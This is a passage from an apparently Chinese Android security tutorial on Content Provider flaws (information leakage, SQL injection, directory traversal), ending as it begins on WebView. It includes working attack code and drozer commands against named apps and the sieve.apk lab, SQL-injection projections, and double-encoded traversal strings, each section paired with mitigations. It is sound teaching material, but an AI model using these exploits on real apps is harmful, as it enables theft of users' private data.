class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().registerContentObserver(Uri.parse(<span class="string">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class="line">        <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">PersonObserver</span>(<span class="keyword">new</span> <span class="title class_">Handler</span>()));</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonObserver</span> <span class="keyword">extends</span> <span class="title class_">ContentObserver</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">PersonObserver</span><span class="params">(Handler handler)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(handler);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChange</span><span class="params">(<span class="type">boolean</span> selfChange)</span> &#123;</span><br><span class="line">        <span class="comment">//to do something</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="Content-Provider漏洞原理分析">Content Provider漏洞原理分析</h3><ul><li>信息泄露</li><li>SQL注入</li><li>目录遍历</li></ul><p>Content Provider漏洞的危害：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Android中Content </span>Provider起到在不同的进程APP之间实现共享数据的作用，通过<span class="keyword">Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作</span></span><br><span class="line"><span class="keyword"></span>而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞</span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列出uri</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.finduri 包名</span><br><span class="line"></span><br><span class="line">输出数据内容</span><br><span class="line">adb <span class="keyword">shell</span> content <span class="keyword">query</span> --uri + 具体uri路径  或者 <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> <span class="string">&quot;具体uri&quot;</span></span><br></pre></td></tr></table></figure><h4 id="信息泄露">信息泄露</h4><p><strong>原理介绍</strong></p><p>content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。</p><p><strong>漏洞复现</strong></p><p>案例：<strong>盛大有你Android存在信息泄露漏洞</strong></p><p><strong>目标代码</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;.providers.YouNiProvider&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:process</span>=<span class="string">&quot;com.snda.youni.mms&quot;</span>   <span class="attr">android:authorities</span>=<span class="string">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码分析:</strong></p><p>我们可以分析目标程序的provider的进程名和授权的的URI，我们可以根据授权的URI来构建一个URI，然后通过contentresolver去读取里面的的列表名信息，这样我们就可以获取APP中的隐私数据信息。</p><p>案例2：sieve.apk</p><ul><li><p>先扫描可访问的URI<br><code>run scanner.provider.finduris -a &lt;包名&gt;</code><br><img src="assets/image-20240923165949228.png" alt="image-20240923165949228"></p></li><li><p>可以对敏感信息进行读取<br><img src="assets/image-20240923170729848.png" alt="image-20240923170729848"></p></li><li><p>可以看到有账号密码之类的数据</p></li></ul><p>案例3：<a href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9546: Download Provider文件头信息泄露</a></p><p><strong>漏洞描述</strong></p><p>Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。</p><p><strong>目标代码</strong></p><p>读取header的URI为：<code>content://download/mydownloads/download_id/headers</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class="line">        sb.append(<span class="string">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowHeader</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;header&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowValue</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">            sb.append(rowHeader).append(<span class="string">&quot;: &quot;</span>).append(rowValue).append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>安全防护</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.minSdkVersion不低于<span class="number">9</span></span><br><span class="line"><span class="number">2</span>.不向外部app提供数据的私有<span class="attribute">content</span> provider显示设置exported=”false”，避免组件暴露(编译api小于<span class="number">17</span>时更应注意此点)</span><br><span class="line"><span class="number">3</span>.内部app通过<span class="attribute">content</span> provid交换数据时，设置protectionLevel=”signature”验证签名</span><br><span class="line"><span class="number">4</span>.公开的<span class="attribute">content</span> provider确保不存储敏感数据</span><br><span class="line"> </span><br><span class="line">针对权限保护绕过防御措施：</span><br><span class="line"><span class="number">1</span>.使用Context<span class="selector-class">.checkCallingPermission</span>()和Context<span class="selector-class">.enforceCallingPermission</span>()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。</span><br><span class="line"><span class="number">2</span>.可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。</span><br></pre></td></tr></table></figure><h4 id="SQL注入漏洞">SQL注入漏洞</h4><p><strong>原理介绍</strong></p><p>​        对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。<br>所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。<br>另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。</p><p><strong>drozer关于SQL注入的相关命令</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">检测SQL注入</span><br><span class="line"><span class="keyword">run</span> scanner.provider.injection -a 包名</span><br><span class="line"></span><br><span class="line">检测目录遍历</span><br><span class="line"><span class="keyword">run</span> scanner.provider.traversal -a 包名</span><br><span class="line"></span><br><span class="line">SQL注入</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> 具体uri + [--projection] [selection]</span><br><span class="line">示例： <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.DBContentProvider/Passwords/ </span></span><br><span class="line">--projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure><p>案例：sieve.apk</p><ul><li><p>检测SQL注入<br><code>run scanner.provider.injection  </code>-<code>a &lt;包名&gt;</code><img src="assets/image-20240923184807857.png" alt="image-20240923184807857"></p></li><li><p>构造sql</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>列出所有表信息|</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>列出该app表信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span>  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span>.sieve</span><br></pre></td></tr></table></figure></li></ul><h4 id="目录遍历漏洞">目录遍历漏洞</h4><p><strong>原理介绍</strong></p><p>Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的</p><p><strong>漏洞触发的前提条件</strong></p><p>对外暴露的Content Provider组件实现了openFile()接口<br>没有对所访问的目标文件Uri进行有效判断，如没有过滤限制如，“…/”可实现任意可读文件的访问的Content Query Uri</p><p><strong>漏洞复现</strong></p><p>案例：<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407">赶集网Android客户端Content Provider组件任意文件读取漏洞</a></p><p><strong>漏洞分析</strong></p><p>赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=“true”,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过&quot;…/&quot;实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据）。</p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GJContentProviderFileOperations</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> getContentResolver().openInputStream(Uri.parse(<span class="string">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            n = in.read(buffer);</span><br><span class="line">            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        debugInfo(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>案例2：sieve.apk</strong></p><ul><li><p>检测是否有目录遍历漏洞<br><code>run scanner.provider.traversal -a &lt;包名&gt;</code><img src="assets/image-20240923200141351.png" alt="image-20240923200141351"></p></li><li><p>读取系统文件<br><code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code><img src="assets/image-20240923200417923.png" alt="image-20240923200417923"></p></li><li><p>下载系统文件<br><code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</code><img src="assets/image-20240923200859074.png" alt="image-20240923200859074"></p></li></ul><p>案例3：</p><p><strong>目标代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span>;</span><br><span class="line"><span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">    File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class="line">    <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以从目标代码中分析，这段代码使用android.net.Uri.getLastPathSegment()从paramUri中获取文件名，然后将其放置在预定义好的目录IMAGE_DIRECTORY中，如果该URL是encoded编码后的，那么将可能导致目录遍历漏洞</p><p>Android4.3开始，Uri.getLastPathSegment()内部实现调用Uri.getPathSegments()</p><p>Uri.getPathSegments首先会通过getEncoded()获取一个路径，然后以”/“为分隔符将path分成片段，最后调用decode()方法解码</p><p>假如我们传递encoded编码后的url给getLastPathSegment()，编码后的分隔符就变成了%2F,绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是API设计方面的问题，直接导致了目录遍历漏洞</p><p>为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给getLastPathSegment()之前解码，采用调用两次getLastPathSegment()方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span> <span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">这个编码后的URL： ..%<span class="number">2F</span>..%<span class="number">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml  </span><br><span class="line">第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。  </span><br><span class="line">第二次调用getLastPathSegment()会返回Example.xml </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">然而攻击者可以采用一种叫做<span class="string">&quot;Double Encoding&quot;</span>的技术，使得第一次调用getLastPathSegment()后无法解码。</span><br><span class="line"> </span><br><span class="line">比如下面经过<span class="type">double</span> encoded后的string就可以绕过上面这种防御</span><br><span class="line"> </span><br><span class="line">%252E%252E%<span class="number">252F</span>%252E%252E%<span class="number">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml</span><br><span class="line"> </span><br><span class="line">第一次解码后： %2E%2E%<span class="number">2F</span>%2E%2E%<span class="number">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class="line"> </span><br><span class="line">第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml</span><br><span class="line">仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径</span><br></pre></td></tr></table></figure><p><strong>安全防护</strong></p><ol><li>将不必要导出的Content Provider设置为不导出</li><li>去除没有必要的openFile()接口</li><li>过滤限制跨域访问，对访问的目标文件的路径进行有效判断</li><li>设置权限来进行内部应用通过Content Provider的数据共享</li></ol><h2 id="Webview漏洞"><strong>Webview漏洞</strong></h2><h3 id="WebView基本使用">WebView基本使用</h3><h4 id="打开网页">打开网页</h4><p><strong>控件注册</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>代码实现</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得控件</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//访问网页</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//返回true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p>最后我们在配置文件中添加网络权限：</p><p><code>&lt;uses</code>-<code>permission android:name</code>=<code>&quot;android.permission.INTERNET&quot;` `/</code>&gt;</p><h4 id="远程加载、">远程加载、</h4><p>js调用Android</p><p>在本地创建一个js文件,命名attack.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span><br><span class="line"><span class="language-javascript">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开启一个http_server监听</p><p><code>python -m http.server 8080</code></p><p>编写java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line"><span class="comment">//loadData(String data, String mimeType, String encoding)</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="常用类使用">常用类使用</h4><h5 id="WebSettings"><strong>WebSettings</strong></h5><p>作用：对WebView进行配置和管理</p><p>配置步骤：</p><p>第一步：添加访问网络权限（AndroidManifest.xml）</p><p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</code></p><p>注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 <code>ERR_CLEARTEXT_NOT_PERMITTED</code>。因此http的url均无法在webview中加载，可以在manifest中application节点添加<code>android:usesCleartextTraffic=&quot;true&quot;</code>。</p><p>第二步：生成一个WebView组件（有两种方式）</p><figure class="highlight java"><table><tr><td 